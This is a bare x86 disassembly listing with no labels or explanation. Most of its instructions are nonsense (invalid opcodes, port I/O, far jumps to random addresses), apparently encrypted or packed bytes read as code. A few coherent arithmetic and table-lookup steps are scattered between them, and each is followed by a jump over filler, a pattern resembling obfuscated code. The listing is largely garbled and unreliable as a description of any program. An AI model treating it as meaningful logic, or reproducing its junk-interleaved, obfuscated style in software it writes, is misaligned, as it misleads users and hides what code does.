  40d2ba:	add    eax,edx
  40d2bc:	mov    edx,DWORD PTR [ebp+0x14]
  40d2bf:	jmp    0x40d5df
  40d2c4:	xor    ch,cl
  40d2c6:	xor    DWORD PTR [ecx+0x69b241f1],eax
  40d2cc:	xor    esi,ebx
  40d2ce:	pop    ecx
  40d2d0:	mov    dh,0x52
  40d2d2:	dec    ebp
  40d2d3:	iret   
  40d2d4:	sub    al,0x95
  40d2d6:	jle    0x40d356
  40d2d8:	jge    0x40d357
  40d2da:	jle    0x40d35a
  40d2dc:	add    al,0x18
  40d2de:	jne    0x40d30a
  40d2e0:	ds in  eax,dx
  40d2e2:	sub    al,0x2f
  40d2e4:	out    dx,eax
  40d2e5:	adc    edi,ebx
  40d2e7:	push   edx
  40d2e8:	nop
  40d2e9:	cdq    
  40d2ea:	or     DWORD PTR [edx+0x628fe0dc],0xffffff8a
  40d2f1:	lock add bh,dh
  40d2f4:	pop    edx
  40d2f5:	ret    0xf76
  40d2f8:	loope  0x40d2eb
  40d2fa:	out    dx,eax
  40d2fb:	daa    
  40d2fc:	jle    0x40d283
  40d2fe:	cmp    ecx,DWORD PTR [edi+0xc29cd9b]
  40d304:	push   ecx
  40d305:	push   DWORD PTR [edx]
  40d307:	add    BYTE PTR [edi],al
  40d309:	adc    al,0x7b
  40d30b:	ins    BYTE PTR es:[edi],dx
  40d30c:	out    0x27,eax
  40d30e:	mov    al,0xdc
  40d310:	nop
  40d311:	jmp    DWORD PTR [ebp-0x180cc68b]
  40d317:	and    eax,0x8cb835b8
  40d31c:	inc    edi
  40d31d:	retf   
  40d31e:	jle    0x40d396
  40d320:	sbb    al,0x21
  40d322:	pop    ecx
  40d323:	outs   dx,BYTE PTR ds:[esi]
  40d324:	pop    ecx
  40d325:	pusha  
  40d326:	pop    eax
  40d327:	int    0xf5
  40d329:	mov    ah,BYTE PTR [esi]
  40d32b:	das    
  40d32c:	mov    bl,cl
  40d32e:	ds inc ebp
  40d330:	mov    DWORD PTR [ecx],ebp
  40d332:	jno    0x40d2cf
  40d334:	call   0x7a32b235
  40d339:	inc    ebx
  40d33a:	pop    ds
  40d33b:	mov    eax,ds:0xf1ac2eee
  40d340:	pop    es
  40d341:	xchg   ebp,eax
  40d342:	shl    al,cl
  40d344:	std    
  40d345:	js     0x40d350
  40d347:	repz leave 
  40d349:	lea    edi,[eax-0x17e51961]
  40d34f:	jmp    0x40d31f
  40d351:	stos   DWORD PTR es:[edi],eax
  40d352:	and    al,0x68
  40d354:	jge    0x40d301
  40d356:	and    ecx,DWORD PTR [eax+0x5d]
  40d359:	xchg   ebp,eax
  40d35a:	inc    edi
  40d35b:	(bad)  
  40d35c:	stos   DWORD PTR es:[edi],eax
  40d35d:	push   ss
  40d35e:	cs jo  0x40d350
  40d361:	mov    al,ds:0xd98ab915
  40d366:	dec    ebx
  40d367:	or     eax,0x894d783c
  40d36c:	das    
  40d36d:	pop    ss
  40d36e:	gs mov bh,0x56
  40d371:	inc    ecx
  40d372:	inc    edi
  40d373:	xor    dh,dl
  40d375:	test   DWORD PTR [ecx-0x7d58286],edx
  40d37b:	mov    ds:0xe15c5342,al
  40d380:	fcmovnb st,st(6)
  40d382:	daa    
  40d383:	xchg   esi,eax
  40d384:	push   eax
  40d385:	je     0x40d3e3
  40d387:	mov    ah,0xd6
  40d389:	cmp    ah,BYTE PTR [ebx]
  40d38b:	jb     0x40d3bf
  40d38d:	inc    esi
  40d38e:	ins    DWORD PTR es:[edi],dx
  40d38f:	adc    al,BYTE PTR [edi]
  40d391:	jecxz  0x40d3fb
  40d393:	add    ebp,esi
  40d395:	inc    ebp
  40d396:	push   ecx
  40d397:	mov    ah,0xfc
  40d399:	pop    esp
  40d39a:	daa    
  40d39b:	and    ebp,DWORD PTR [edi+edx*2]
  40d39e:	loop   0x40d3c4
  40d3a0:	add    al,0xe1
  40d3a2:	jmp    0x40d340
  40d3a4:	adc    al,0x3
  40d3a6:	retf   0x805c
  40d3a9:	mov    BYTE PTR [edx],dh
  40d3ab:	pop    es
  40d3ac:	mov    ah,0x5c
  40d3ae:	and    al,0xbf
  40d3b0:	dec    eax
  40d3b1:	addr16 mov ah,0x29
  40d3b4:	pop    eax
  40d3b5:	scas   al,BYTE PTR es:[edi]
  40d3b6:	jb     0x40d39c
  40d3b8:	mov    bl,0x49
  40d3ba:	mov    DWORD PTR [esi-0x3c],0x6b4c70e3
  40d3c1:	jae    0x40d3b4
  40d3c3:	out    dx,al
  40d3c4:	scas   eax,DWORD PTR es:[edi]
  40d3c5:	lods   eax,DWORD PTR ds:[esi]
  40d3c6:	lods   al,BYTE PTR ds:[esi]
  40d3c7:	jno    0x40d399
  40d3c9:	ins    DWORD PTR es:[edi],dx
  40d3ca:	ss push eax
  40d3cc:	xchg   edi,eax
  40d3cd:	and    DWORD PTR [eax+0x4],esi
  40d3d0:	jle    0x40d444
  40d3d2:	xchg   ebp,eax
  40d3d3:	sub    edx,ebp
  40d3d5:	pop    eax
  40d3d6:	push   0x61
  40d3d8:	jecxz  0x40d3f0
  40d3da:	dec    ebx
  40d3db:	enter  0x4674,0x6f
  40d3df:	jecxz  0x40d44c
  40d3e1:	inc    ebx
  40d3e2:	mov    edx,0xf7cd56b0
  40d3e7:	addr16 inc edx
  40d3e9:	repnz sbb al,0x45
  40d3ec:	loopne 0x40d3f9
  40d3ee:	pushf  
  40d3ef:	or     DWORD PTR [edx-0x2890dfd9],eax
  40d3f5:	cld    
  40d3f6:	jb     0x40d38c
  40d3f8:	or     eax,DWORD PTR [edi+0x76]
  40d3fb:	scas   al,BYTE PTR es:[edi]
  40d3fc:	test   DWORD PTR [ebx],ebx
  40d3fe:	jmp    0xc73c255
  40d403:	push   edi
  40d404:	mov    DWORD PTR [ecx],edx
  40d406:	ja     0x40d39a
  40d408:	cwde   
  40d409:	push   esp
  40d40a:	stc    
  40d40b:	or     BYTE PTR [eax-0x5211bf54],al
  40d411:	xchg   ebx,eax
  40d412:	ins    DWORD PTR es:[edi],dx
  40d413:	not    DWORD PTR [ecx]
  40d415:	out    dx,al
  40d416:	hlt    
  40d417:	and    bh,BYTE PTR [edx+eiz*4+0xc]
  40d41b:	aaa    
  40d41c:	(bad)  
  40d41e:	in     eax,dx
  40d41f:	retf   0x40d9
  40d422:	fwait
  40d423:	clc    
  40d424:	pop    edi
  40d425:	out    dx,eax
  40d426:	das    
  40d427:	jae    0x40d45d
  40d429:	fimul  DWORD PTR [eax-0x359fb27c]
  40d42f:	ja     0x40d404
  40d431:	xor    ebp,DWORD PTR [ecx-0x58]
  40d434:	mov    ah,0xe8
  40d436:	pop    esp
  40d437:	pop    esp
  40d438:	in     eax,dx
  40d439:	ss loop 0x40d3f3
  40d43c:	rcl    BYTE PTR [ebx-0x5e11a5ca],0x73
  40d443:	push   ss
  40d444:	inc    eax
  40d445:	sbb    esi,0xffffffd7
  40d448:	add    ah,dl
  40d44a:	hlt    
  40d44b:	dec    esp
  40d44c:	mov    eax,ds:0x9d62ac25
  40d451:	ret    
  40d452:	mov    eax,0x622ed4fd
  40d457:	push   edi
  40d458:	push   cs
  40d459:	out    0xa6,al
  40d45b:	dec    eax
  40d45c:	outs   dx,BYTE PTR ds:[esi]
  40d45d:	sbb    al,0xa5
  40d45f:	xor    eax,0xb114924
  40d464:	shr    DWORD PTR [edx-0x28],0xe0
  40d468:	adc    eax,0xe8525f2
  40d46d:	fnstcw WORD PTR [esi-0x647b8f3f]
  40d473:	push   esp
  40d474:	test   DWORD PTR [esi],edx
  40d476:	in     al,dx
  40d477:	aas    
  40d478:	cmp    bh,BYTE PTR [edx-0x1d4bd9bf]
  40d47e:	test   BYTE PTR [ebp+eiz*4-0x4e],ch
  40d482:	sbb    eax,0xa36d35b5
  40d487:	push   ebx
  40d488:	cmc    
  40d489:	in     al,dx
  40d48a:	ins    BYTE PTR es:[edi],dx
  40d48b:	loopne 0x40d489
  40d48d:	bound  eax,QWORD PTR [ebx-0x6721dd10]
  40d493:	or     al,dl
  40d495:	mov    ebp,DWORD PTR [ebp-0x5918145b]
  40d49b:	ja     0x40d422
  40d49d:	xchg   ebx,eax
  40d49e:	lods   al,BYTE PTR ds:[esi]
  40d49f:	cmp    al,BYTE PTR [ecx+0x6dc24ad4]
  40d4a5:	sbb    BYTE PTR [esi+ebx*4],0x5c
  40d4a9:	ret    
  40d4aa:	and    DWORD PTR [esi+0x75],0x63
  40d4ae:	fsub   DWORD PTR [ebx-0x7fa14d5b]
  40d4b4:	rcr    bh,0xf6
  40d4b7:	ins    BYTE PTR es:[edi],dx
  40d4b8:	inc    edx
  40d4b9:	xor    esp,0x5d
  40d4bc:	sub    bl,dl
  40d4be:	inc    ecx
  40d4bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4c0:	or     al,0xaa
  40d4c2:	dec    esp
  40d4c3:	retf   0x7b5d
  40d4c6:	int3   
  40d4c7:	add    al,0x94
  40d4c9:	jg     0x40d452
  40d4cb:	(bad)  
  40d4cc:	std    
  40d4cd:	or     ch,al
  40d4cf:	lock call 0x3b8e:0x1ad79fd2
  40d4d7:	rcr    BYTE PTR [edi-0x1392490e],cl
  40d4dd:	rol    DWORD PTR [ebp+ebx*8+0x60],cl
  40d4e1:	inc    eax
  40d4e2:	fstp   st(5)
  40d4e4:	out    0x90,eax
  40d4e6:	or     cl,BYTE PTR [edi-0x5a]
  40d4e9:	mov    ebp,?
  40d4eb:	xchg   edi,eax
  40d4ec:	inc    edx
  40d4ed:	out    dx,eax
  40d4ee:	aam    0xec
  40d4f0:	adc    ebp,esp
  40d4f2:	adc    BYTE PTR [esi],al
  40d4f4:	int    0x8c
  40d4f6:	je     0x40d4fd
  40d4f8:	dec    eax
  40d4f9:	jo     0x40d4b8
  40d4fb:	fldenv [edx+0x270ad9e1]
  40d501:	or     ch,BYTE PTR [edx+esi*2]
  40d504:	test   eax,0xb26df635
  40d509:	cmp    DWORD PTR [ebx+0x70],edi
  40d50c:	push   edx
  40d50d:	cmp    al,0xa
  40d50f:	data16 (bad) 
  40d511:	js     0x40d545
  40d513:	jne    0x40d52d
  40d515:	mov    bh,0xa9
  40d517:	adc    ebx,ebx
  40d519:	pop    es
  40d51a:	sahf   
  40d51b:	push   esp
  40d51c:	mov    ebp,0x511cc383
  40d521:	xor    BYTE PTR [edi+0x62aaa40a],bh
  40d527:	push   DWORD PTR [edx-0x7a]
  40d52a:	mov    edi,0x226657c
  40d52f:	adc    dh,BYTE PTR [esi]
  40d531:	pop    edx
  40d532:	mov    edi,0x94172e32
  40d537:	xor    bl,BYTE PTR [ecx-0x6e4e0f70]
  40d53d:	pop    ebx
  40d53e:	sbb    esp,DWORD PTR [edx-0x47]
  40d541:	ss loope 0x40d584
  40d544:	mov    ecx,0x3f7b5d7c
  40d549:	stos   BYTE PTR es:[edi],al
  40d54a:	mov    ?,ebx
  40d54c:	(bad)  
  40d54d:	fdivr  DWORD PTR [ebx]
  40d54f:	mov    ecx,0x12ef5024
  40d554:	sar    DWORD PTR [eax],cl
  40d556:	daa    
  40d557:	(bad)  
  40d558:	pop    eax
  40d559:	dec    esi
  40d55a:	cmp    esi,DWORD PTR ds:0x60812343
  40d560:	test   eax,0xb94bfa26
  40d565:	sar    BYTE PTR [edx+0x9],0xca
  40d569:	xchg   ecx,eax
  40d56a:	and    BYTE PTR [eax+0x3c95133a],ch
  40d570:	out    dx,al
  40d571:	or     eax,edx
  40d573:	(bad)  
  40d574:	ss jmp 0xceed:0x194f5a9b
  40d57c:	(bad)  
  40d57d:	push   0xffffff8f
  40d57f:	enter  0xe929,0x34
  40d583:	mov    ds:0x24f98248,al
  40d588:	or     DWORD PTR cs:[eax+0x6e62d2c3],edi
  40d58f:	add    DWORD PTR ds:0x9bbe54e5,edi
  40d595:	adc    edi,DWORD PTR [ecx-0x2f6cd685]
  40d59b:	stos   BYTE PTR es:[edi],al
  40d59c:	mov    ebx,DWORD PTR [esi+0x46]
  40d59f:	and    eax,0xcb548998
  40d5a4:	in     al,0xcc
  40d5a6:	aad    0xac
  40d5a8:	push   0x59
  40d5aa:	out    0x93,al
  40d5ac:	fcmovu st,st(4)
  40d5ae:	mov    ebp,0xcecd3791
  40d5b3:	adc    eax,0x8cfce56c
  40d5b8:	sbb    edi,ecx
  40d5ba:	pusha  
  40d5bb:	retf   
  40d5bc:	loop   0x40d562
  40d5be:	inc    esi
  40d5bf:	mov    eax,ds:0x1133df8c
  40d5c4:	ror    DWORD PTR [ebp-0x2bc4d1fe],0x0
  40d5cb:	in     eax,dx
  40d5cc:	add    al,0x91
  40d5ce:	test   al,0x57
  40d5d0:	out    0xe2,eax
  40d5d2:	aam    0x39
  40d5d4:	pop    edx
  40d5d5:	add    bl,BYTE PTR [esi+edx*4]
  40d5d8:	loope  0x40d579
  40d5da:	imul   eax,DWORD PTR [esi+0xf03f35a],0x558b02af
  40d5e4:	cld    
  40d5e5:	xor    edx,ecx
  40d5e7:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5ea:	lea    ecx,[edx+ecx*1+0x32729b]
  40d5f1:	cmp    ecx,eax
  40d5f3:	je     0x40dfca
  40d5f9:	mov    edi,DWORD PTR [ebp-0x18]
  40d5fc:	mov    eax,DWORD PTR [ebp+0x8]
  40d5ff:	mov    edx,DWORD PTR [ebp+0x14]
  40d602:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d606:	mov    ecx,0x7510854
  40d60b:	xor    edx,edx
  40d60d:	xor    edi,ecx
  40d60f:	mov    esi,0x32729b
  40d614:	add    edi,esi
  40d616:	div    edi
  40d618:	mov    edx,DWORD PTR [ebp-0x4]
  40d61b:	jmp    0x40d93b
  40d620:	inc    ecx
  40d621:	stos   BYTE PTR es:[edi],al
  40d622:	push   ss
  40d623:	jmp    0x40d61a
  40d625:	jae    0x40d688
  40d627:	mov    al,0xbf
  40d629:	jo     0x40d5c5
  40d62b:	jecxz  0x40d61d
  40d62d:	cmp    eax,DWORD PTR ds:0x7e902baa
  40d633:	jle    0x40d6b2
  40d635:	jge    0x40d6b5
  40d637:	jle    0x40d5fc
  40d639:	ins    DWORD PTR es:[edi],dx
  40d63a:	mov    al,ds:0xa8360809
  40d63f:	mov    eax,ds:0x1659bf74
  40d644:	ins    BYTE PTR es:[edi],dx
  40d645:	dec    ebx
  40d646:	data16 sub al,0x6e
  40d649:	lods   eax,DWORD PTR ds:[esi]
  40d64a:	xchg   edx,eax
  40d64b:	mov    cl,0xa9
  40d64d:	call   0x80b:0x1d0dbe74
  40d654:	enter  0x214b,0x64
  40d658:	popf   
  40d659:	pusha  
  40d65a:	or     eax,0xfdb1eb37
  40d65f:	pop    ebp
  40d660:	adc    dh,BYTE PTR [eax-0x34]
  40d663:	std    
  40d664:	dec    edx
  40d665:	pop    ecx
  40d666:	mov    ah,0x69
  40d668:	out    dx,eax
  40d669:	dec    ecx
  40d66a:	pop    ss
  40d66b:	fs gs clc 
  40d66e:	fisub  WORD PTR [eax-0x1]
  40d671:	pop    ds
  40d672:	mov    edi,ecx
  40d674:	mov    WORD PTR [esi],cs
  40d676:	mov    al,ds:0x204e91ce
  40d67b:	imul   edi,DWORD PTR [eax-0x6],0x4aa7f492
  40d682:	push   ebp
  40d683:	bound  edi,QWORD PTR [ebx-0x306a7feb]
  40d689:	cmp    DWORD PTR [ebx+eiz*4],ecx
  40d68c:	jo     0x40d667
  40d68e:	mov    bh,0xe3
  40d690:	adc    esi,DWORD PTR [edi+0x57]
  40d693:	outs   dx,BYTE PTR ds:[esi]
  40d694:	push   edx
  40d695:	repnz xchg ecx,eax
  40d697:	in     al,0x96
  40d699:	mov    dl,0x4e
  40d69b:	jmp    0xf046:0xae331139
  40d6a2:	inc    ebx
  40d6a3:	pop    esp
  40d6a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6a5:	fld    QWORD PTR [eax+0x60]
  40d6a8:	call   0xe184:0xe8c8cf39
  40d6af:	es test al,0x39
  40d6b2:	inc    edx
  40d6b3:	scas   al,BYTE PTR es:[edi]
  40d6b4:	mov    bh,0x57
  40d6b6:	shr    DWORD PTR [ebp+edx*8-0x699122d4],1
  40d6bd:	icebp  
  40d6be:	(bad)  
  40d6bf:	dec    ebp
  40d6c0:	cmp    eax,esp
  40d6c2:	in     al,dx
  40d6c3:	dec    ebx
  40d6c4:	mov    dh,0x39
  40d6c6:	pop    ecx
  40d6c7:	test   BYTE PTR [edi+eax*1+0x72],al
  40d6cb:	js     0x40d6a2
  40d6cd:	sar    BYTE PTR [eax-0x40],1
  40d6d0:	mov    ?,WORD PTR [eax-0x5393231a]
  40d6d6:	pusha  
  40d6d7:	push   cs
  40d6d8:	mov    esi,0xcaab9621
  40d6dd:	push   ecx
  40d6de:	push   ebx
  40d6df:	dec    eax
  40d6e0:	adc    al,0xb7
  40d6e2:	jae    0x40d66f
  40d6e4:	ss (bad) 
  40d6e6:	repz push 0x14
  40d6e9:	sahf   
  40d6ea:	rcr    BYTE PTR [edx+0x17],1
  40d6ed:	inc    edx
  40d6ee:	(bad)  
  40d6ef:	mov    ecx,edx
  40d6f1:	mov    ecx,DWORD PTR [edi+0x47]
  40d6f4:	mov    dl,0x6b
  40d6f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6f7:	test   ebx,esi
  40d6f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6fa:	and    eax,0xdbc28328
  40d6ff:	ficomp WORD PTR [edx]
  40d701:	pushf  
  40d702:	pop    es
  40d703:	push   0xa6e564c7
  40d708:	es fwait
  40d70a:	adc    DWORD PTR [edx-0x707ccd04],edx
  40d710:	ss inc esp
  40d712:	aam    0xfc
  40d714:	es fs test al,0x3f
  40d718:	fbld   TBYTE PTR [ecx+0x2883827e]
  40d71e:	pop    ecx
  40d71f:	xlat   BYTE PTR ds:[ebx]
  40d720:	outs   dx,DWORD PTR ds:[esi]
  40d721:	inc    edi
  40d722:	cmc    
  40d723:	xor    al,0x42
  40d725:	mov    WORD PTR [ecx+0x3c],?
  40d728:	dec    edx
  40d729:	mov    cl,0xde
  40d72b:	ficom  WORD PTR [ebp+0x1e]
  40d72e:	aaa    
  40d72f:	mov    esi,0x193b04ce
  40d734:	sbb    esi,eax
  40d736:	aaa    
  40d737:	and    eax,0x17027343
  40d73c:	mov    ebp,0x5ce106f4
  40d741:	lds    esi,FWORD PTR fs:[ecx-0x9]
  40d745:	je     0x40d744
  40d747:	arpl   WORD PTR [edi+edx*4-0x4b966241],si
  40d74e:	or     ch,BYTE PTR ds:0xe9ab213c
  40d754:	ror    DWORD PTR [esi],cl
  40d756:	shr    DWORD PTR [edx-0x23bcaaf9],cl
  40d75c:	jo     0x40d705
  40d75e:	inc    ecx
  40d75f:	ins    BYTE PTR es:[edi],dx
  40d760:	out    0x2a,eax
  40d762:	pop    ss
  40d763:	jmp    0xeaa8:0xf44979ba
  40d76a:	sti    
  40d76b:	mov    ecx,0x197d9d05
  40d770:	(bad)  
  40d771:	in     al,dx
  40d772:	daa    
  40d773:	pop    eax
  40d774:	mov    ds:0x21b8d201,al
  40d779:	jae    0x40d736
  40d77b:	or     BYTE PTR [esi+eiz*2+0x37],al
  40d77f:	mov    esi,0xd26f3511
  40d784:	rol    BYTE PTR ds:0xb8024ab9,cl
  40d78a:	div    BYTE PTR [edi-0x69691549]
  40d790:	loopne 0x40d7b7
  40d792:	pop    edi
  40d793:	ret    0x45e2
  40d796:	(bad)  
  40d797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d798:	mov    bh,0x6d
  40d79a:	and    ecx,edx
  40d79c:	loope  0x40d744
  40d79e:	dec    edx
  40d79f:	xor    ah,BYTE PTR [edx-0x2e597800]
  40d7a5:	(bad)  [esi-0x257e5f76]
  40d7ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7ac:	dec    eax
  40d7ad:	mov    dh,0x6d
  40d7af:	ja     0x40d74a
  40d7b1:	dec    esi
  40d7b2:	repnz (bad) 
  40d7b4:	push   eax
  40d7b5:	out    dx,eax
  40d7b6:	call   0x1a1c3164
  40d7bb:	stc    
  40d7bc:	and    dl,BYTE PTR [edi-0x33e1356d]
  40d7c2:	leave  
  40d7c3:	shl    BYTE PTR ds:0xdb019287,cl
  40d7c9:	fdiv   QWORD PTR [edx]
  40d7cb:	fdivr  DWORD PTR [edx]
  40d7cd:	push   0x57
  40d7cf:	mov    ebp,0x385a2234
  40d7d4:	clc    
  40d7d5:	cmp    dh,bl
  40d7d7:	or     al,0x9a
  40d7d9:	test   DWORD PTR [edx+0x290df363],esi
  40d7df:	(bad)  
  40d7e0:	stc    
  40d7e1:	iret   
  40d7e2:	sub    ebx,DWORD PTR fs:[edx+edi*4-0x44]
  40d7e7:	out    dx,al
  40d7e8:	cdq    
  40d7e9:	mov    edx,0x4cb17fe1
  40d7ee:	fwait
  40d7ef:	xor    eax,DWORD PTR [ebp-0x35]
  40d7f2:	stos   BYTE PTR es:[edi],al
  40d7f3:	je     0x40d822
  40d7f5:	(bad)  
  40d7f6:	bswap  ebp
  40d7f8:	adc    al,0x3f
  40d7fa:	out    dx,eax
  40d7fb:	(bad)  
  40d7fc:	icebp  
  40d7fd:	int3   
  40d7fe:	xor    ebp,esi
  40d800:	idiv   BYTE PTR [esp+edi*8]
  40d803:	lods   al,BYTE PTR ds:[esi]
  40d804:	outs   dx,DWORD PTR ds:[esi]
  40d805:	inc    ebx
  40d807:	js     0x40d7da
  40d809:	or     dl,bl
  40d80b:	add    al,cl
  40d80d:	adc    al,0xd6
  40d80f:	xlat   BYTE PTR ds:[ebx]
  40d810:	test   DWORD PTR [ebx-0x77],ebx
  40d813:	cs pop esi
  40d815:	retf   
  40d816:	je     0x40d7e6
  40d818:	mov    cl,0xcb
  40d81a:	fbld   TBYTE PTR [ebx-0x51cdbbae]
  40d820:	jge    0x40d7e1
  40d822:	fidivr WORD PTR [ebp+edi*2-0x30d71e67]
  40d829:	stos   DWORD PTR es:[edi],eax
  40d82a:	dec    ebx
  40d82b:	xor    BYTE PTR [ebx-0x73],ch
  40d82e:	ret    
  40d82f:	push   eax
  40d830:	push   es
  40d831:	add    edi,esp
  40d833:	out    0x9d,eax
  40d835:	pop    ebp
  40d837:	or     cl,BYTE PTR [ebx-0xaa73ff0]
  40d83d:	iret   
  40d83e:	in     eax,0xa7
  40d840:	loopne 0x40d85f
  40d842:	(bad)  
  40d843:	mov    ch,0xbb
  40d845:	popf   
  40d846:	fs dec edi
  40d848:	fs jb  0x40d851
  40d84b:	mov    dh,0xc8
  40d84d:	jae    0x40d8cc
  40d84f:	ins    DWORD PTR es:[edi],dx
  40d850:	retf   0xf16f
  40d853:	cmp    eax,0x9461693c
  40d858:	pop    es
  40d859:	pop    eax
  40d85a:	in     eax,0x93
  40d85c:	je     0x40d893
  40d85e:	ds aad 0xae
  40d861:	add    ah,ah
  40d863:	retf   0x7cda
  40d866:	push   esp
  40d867:	push   edx
  40d869:	out    0xcf,eax
  40d86b:	stos   DWORD PTR es:[edi],eax
  40d86c:	cmp    BYTE PTR [bx+si],dl
  40d86f:	ds mov esi,0xb87301f6
  40d875:	jb     0x40d889
  40d877:	add    esp,DWORD PTR [edx-0x65]
  40d87a:	adc    esp,DWORD PTR [eax]
  40d87c:	sub    al,0x19
  40d87e:	xor    DWORD PTR [ebp+0x4b],edx
  40d881:	dec    ecx
  40d882:	sbb    al,0xab
  40d884:	adc    eax,0x76529fab
  40d889:	or     ebx,DWORD PTR cs:[ebx-0x64db91d]
  40d890:	mov    bh,0x38
  40d892:	pop    eax
  40d893:	arpl   cx,di
  40d895:	xchg   esi,eax
  40d896:	mov    ecx,0xde416a19
  40d89b:	pop    DWORD PTR [eax+0xbfde538]
  40d8a1:	out    0x51,al
  40d8a3:	or     bh,dl
  40d8a5:	xchg   BYTE PTR ds:0xb7c9858f,al
  40d8ab:	jge    0x40d916
  40d8ad:	dec    ebp
  40d8ae:	scas   eax,DWORD PTR es:[edi]
  40d8af:	mov    bh,0x3e
  40d8b1:	test   BYTE PTR [ebx-0x4e8cd1f6],0x74
  40d8b8:	retf   
  40d8b9:	jns    0x40d937
  40d8bb:	pop    ss
  40d8bc:	or     eax,0xe9bc123c
  40d8c1:	ss pop ss
  40d8c3:	sbb    DWORD PTR [ebp-0x3d800100],edx
  40d8c9:	addr16 push ds
  40d8cb:	aaa    
  40d8cc:	xor    ecx,edi
  40d8ce:	test   esi,ebp
  40d8d0:	jge    0x40d943
  40d8d2:	int    0xca
  40d8d4:	les    ebx,FWORD PTR [ebx-0x5c]
  40d8d7:	jmp    0x40d890
  40d8d9:	adc    BYTE PTR [ebx],bh
  40d8db:	and    ebx,DWORD PTR [edx+0x42]
  40d8de:	in     eax,dx
  40d8df:	not    BYTE PTR [eax-0x2c]
  40d8e2:	out    0x4e,al
  40d8e4:	jbe    0x40d927
  40d8e6:	sub    DWORD PTR [esi+0x51],esi
  40d8e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8ea:	mov    ss,WORD PTR [ebp-0x2d00bf25]
  40d8f0:	sub    eax,0x491f5aaf
  40d8f5:	push   ds
  40d8f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8f7:	ins    DWORD PTR es:[edi],dx
  40d8f8:	in     al,0xfd
  40d8fa:	or     BYTE PTR [ebx+0x4f],ch
  40d8fd:	inc    si
  40d8ff:	aad    0xd1
  40d901:	inc    esi
  40d902:	push   ebx
  40d903:	call   0xc0a52c1c
  40d908:	stos   BYTE PTR es:[edi],al
  40d909:	scas   eax,DWORD PTR es:[edi]
  40d90a:	or     edi,DWORD PTR [ebx+0x1adb786c]
  40d910:	add    ebx,DWORD PTR [edx+0x4d]
  40d913:	jmp    0x1eb49ea4
  40d918:	stos   BYTE PTR es:[edi],al
  40d919:	out    dx,eax
  40d91a:	mov    ebp,0x9b09629
  40d91f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d920:	aad    0x3d
  40d922:	ds (bad) 
  40d924:	inc    edi
  40d925:	outs   dx,BYTE PTR ds:[esi]
  40d926:	ja     0x40d969
  40d928:	ss adc edx,ebx
  40d92b:	push   cs
  40d92c:	(bad)  
  40d92d:	fmul   st,st(4)
  40d92f:	pusha  
  40d930:	clc    
  40d931:	sub    DWORD PTR [esp+esi*4],edi
  40d934:	add    al,0x75
  40d936:	call   0xd133:0xfe5dc16f
  40d93d:	lea    eax,[edx+eax*1+0x32729b]
  40d944:	jmp    0x40dc64
  40d949:	das    
  40d94a:	sub    BYTE PTR [ecx],0x25
  40d94d:	mov    cl,0xb5
  40d94f:	xor    edx,DWORD PTR [eax-0x2c802913]
  40d955:	fwait
  40d956:	sbb    esp,edi
  40d958:	add    dh,BYTE PTR [esi]
  40d95a:	lahf   
  40d95b:	jle    0x40d9db
  40d95d:	jge    0x40d9dc
  40d95f:	jle    0x40d9df
  40d961:	xchg   edi,eax
  40d962:	push   ss
  40d963:	out    dx,al
  40d964:	push   ebx
  40d965:	out    dx,eax
  40d966:	mov    esp,0x8b68855c
  40d96b:	or     eax,0xc639314f
  40d970:	bound  ecx,QWORD PTR ds:0xc6f0b44c
  40d976:	cmp    al,0x1d
  40d978:	dec    edi
  40d979:	push   eax
  40d97a:	push   0x65ae960a
  40d97f:	xchg   edx,eax
  40d980:	outs   dx,BYTE PTR ds:[esi]
  40d981:	mov    ?,WORD PTR [ecx-0x44]
  40d984:	sbb    ah,BYTE PTR ds:0x15431cf6
  40d98a:	mov    dl,0xe2
  40d98c:	mov    BYTE PTR [esi-0x7e71bdf3],ch
  40d992:	loope  0x40d9e1
  40d994:	xchg   ebx,eax
  40d995:	cmp    eax,0x6e176071
  40d99a:	fcmovnbe st,st(7)
  40d99c:	jp     0x40d972
  40d99e:	(bad)  
  40d99f:	adc    eax,0x25b18982
  40d9a4:	hlt    
  40d9a5:	in     eax,dx
  40d9a6:	div    esi
  40d9a8:	sub    eax,0xcfa2d844
  40d9ad:	mov    fs,WORD PTR [edi+0x5d801eba]
  40d9b3:	lock mov dh,0x4a
  40d9b6:	add    al,0xe5
  40d9b8:	retf   
  40d9b9:	jecxz  0x40d9ff
  40d9bb:	fisttp WORD PTR cs:[esi]
  40d9be:	and    eax,0xff57f837
  40d9c3:	cmc    
  40d9c4:	loope  0x40d9c5
  40d9c6:	pushf  
  40d9c7:	pop    esi
  40d9c8:	xor    DWORD PTR [edx-0x3d703070],ebp
  40d9ce:	mov    bl,0x1a
  40d9d0:	xor    BYTE PTR [ebp+0x67f7c0da],bl
  40d9d6:	lahf   
  40d9d7:	packssdw mm7,QWORD PTR [ebx]
  40d9da:	std    
  40d9db:	rol    DWORD PTR [ebx+0x1e2782d2],0xa6
  40d9e2:	repz jae 0x40da20
  40d9e5:	bndldx bnd3,[esi+0x182dd84b]
  40d9ec:	add    dl,bl
  40d9ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9ef:	clc    
  40d9f0:	ja     0x40d9ce
  40d9f2:	imul   DWORD PTR [esi+ebx*4]
  40d9f5:	xor    dh,al
  40d9f7:	inc    ecx
  40d9f8:	push   ebx
  40d9f9:	jns    0x40da0e
  40d9fb:	push   eax
  40d9fc:	cmp    ebx,DWORD PTR [ebx+0x67]
  40d9ff:	pop    eax
  40da00:	icebp  
  40da01:	cmp    edx,DWORD PTR [ecx]
  40da03:	and    BYTE PTR [edx+0x12],dh
  40da06:	jmp    0x2e5882f
  40da0b:	aam    0xa9
  40da0d:	mov    bh,BYTE PTR [edx]
  40da0f:	jno    0x40da06
  40da11:	fsubr  st(7),st
  40da13:	adc    BYTE PTR [ecx-0xdda9068],ch
  40da19:	adc    al,0x56
